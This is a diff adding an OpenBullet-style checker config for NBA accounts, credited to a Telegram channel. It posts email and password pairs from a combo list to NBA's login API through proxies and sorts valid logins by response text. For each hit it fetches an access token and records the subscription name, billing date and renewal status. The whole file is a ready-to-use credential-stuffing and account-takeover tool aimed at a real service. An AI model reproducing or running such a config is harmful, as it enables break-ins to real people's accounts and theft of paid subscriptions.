@@ -1,0 +1,110 @@
+[SETTINGS]
+{
+  "Name": "NBA",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-12-20T10:56:22.6820671+08:00",
+  "AdditionalInfo": "join @Perfex_Channel for more	",
+  "RequiredPlugins": [],
+  "Author": "@Perfex_Channel",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://identity.nba.com/api/v1/auth" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"rememberMe\":false}" 
+  CONTENTTYPE "application/json" 
+  HEADER "DNT: 1" 
+  HEADER "Host: identity.nba.com" 
+  HEADER "Origin: https://www.nba.com" 
+  HEADER "Referer: https://www.nba.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36" 
+  HEADER "X-Client-Platform: web" 
+  HEADER "Accept: application/json, text/plain, */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password" 
+    KEY "INVALID_EMAIL" 
+    KEY "Invalid JSON payload" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"success" 
+
+REQUEST GET "https://identity.nba.com/api/v1/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*dnt: 1" 
+  HEADER "origin: https://www.nba.com" 
+  HEADER "referer: https://www.nba.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+
+PARSE "<SOURCE>" LR "endeavorCustomerId\":\"" "\"" -> VAR "id" 
+
+REQUEST GET "https://watch.nba.com/secure/authenticate?format=json&skus=true&uidpwd=true&accesstoken=true&esCustomerId=<id>&ciamlogin=true" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "DNT: 1" 
+  HEADER "Host: watch.nba.com" 
+  HEADER "Origin: https://www.nba.com" 
+  HEADER "Referer: https://www.nba.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+
+PARSE "<SOURCE>" LR "accessToken\":\"" "\",\"" -> VAR "access" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "hasSubscription\":\"true" 
+
+REQUEST GET "https://nbaapi.neulion.com/api_nba/v1/account/subscriptions?associations=false" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "authorization: Bearer <access>" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://www.nba.com" 
+  HEADER "referer: https://www.nba.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+
+PARSE "<SOURCE>" LR "name\":\"" "\"" CreateEmpty=FALSE -> CAP "Subscription" 
+
+PARSE "<SOURCE>" LR ",\"billedDate\":\"" "\"" CreateEmpty=FALSE -> CAP "Billed" 
+
+PARSE "<SOURCE>" LR "optinRenew\":" "," CreateEmpty=FALSE -> CAP "Renew" 
+
